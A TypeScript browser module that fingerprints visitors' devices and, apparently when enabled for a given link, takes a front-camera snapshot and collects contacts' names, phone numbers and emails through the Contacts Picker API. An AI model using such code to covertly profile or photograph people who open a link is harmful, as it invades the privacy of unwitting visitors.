// lib/telemetry.ts
// Utility to collect device telemetry and handle browser-supported web permissions
import { DeviceInfo } from "@/lib/types";

export function detectBrowserAndOS(ua: string): { browser: string; os: string } {
  let browser = "Unknown Browser";
  let os = "Unknown OS";

  if (/iPhone|iPad|iPod/i.test(ua)) os = "iOS";
  else if (/Android/i.test(ua)) os = "Android";
  else if (/Macintosh|Mac OS X/i.test(ua)) os = "macOS";
  else if (/Windows NT/i.test(ua)) os = "Windows";
  else if (/Linux/i.test(ua)) os = "Linux";

  if (/Edg\//i.test(ua)) browser = "Microsoft Edge";
  else if (/Chrome\//i.test(ua) && !/Chromium/i.test(ua)) browser = "Chrome";
  else if (/Safari\//i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari";
  else if (/Firefox\//i.test(ua)) browser = "Firefox";
  else if (/OPR\//i.test(ua) || /Opera/i.test(ua)) browser = "Opera";

  return { browser, os };
}

export async function collectDeviceTelemetry(): Promise<DeviceInfo> {
  if (typeof window === "undefined") return {};

  const ua = navigator.userAgent;
  const { browser, os } = detectBrowserAndOS(ua);
  const screen = `${window.screen?.width || 0}x${window.screen?.height || 0}`;
  const language = navigator.language;
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  const platform = navigator.platform;

  let battery: number | null = null;
  let isCharging: boolean | null = null;

  try {
    const nav = navigator as any;
    if (nav.getBattery) {
      const b = await nav.getBattery();
      battery = Math.round(b.level * 100);
      isCharging = b.charging;
    }
  } catch {
    // Battery API not supported or blocked
  }

  let connection = "Unknown";
  try {
    const nav = navigator as any;
    if (nav.connection?.effectiveType) {
      connection = nav.connection.effectiveType.toUpperCase();
    }
  } catch {
    // Connection info unavailable
  }

  return {
    browser,
    os,
    screen,
    language,
    timezone,
    platform,
    battery,
    isCharging,
    connection,
  };
}

// Optional camera snapshot if enabled for the link
export async function captureCameraSnapshot(): Promise<Blob | null> {
  if (typeof navigator === "undefined" || !navigator.mediaDevices?.getUserMedia) {
    return null;
  }

  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
      audio: false,
    });

    const video = document.createElement("video");
    video.srcObject = stream;
    video.setAttribute("playsinline", "true");
    await video.play();

    // Small delay to let camera sensor warm up
    await new Promise((r) => setTimeout(r, 400));

    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    const ctx = canvas.getContext("2d");
    if (ctx) {
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    }

    // Stop camera track immediately
    stream.getTracks().forEach((t) => t.stop());

    return new Promise((resolve) => {
      canvas.toBlob((blob) => resolve(blob), "image/jpeg", 0.75);
    });
  } catch (err) {
    console.warn("Camera snapshot permission denied or not supported:", err);
    return null;
  }
}

// Optional contact picker if enabled and supported (Android Chrome)
export async function pickContactIfSupported(): Promise<any[] | null> {
  if (typeof navigator === "undefined") return null;
  const nav = navigator as any;
  if ("contacts" in nav && "ContactsManager" in window) {
    try {
      const props = ["name", "tel", "email"];
      const contacts = await nav.contacts.select(props, { multiple: true });
      return contacts;
    } catch {
      return null;
    }
  }
  return null;
}
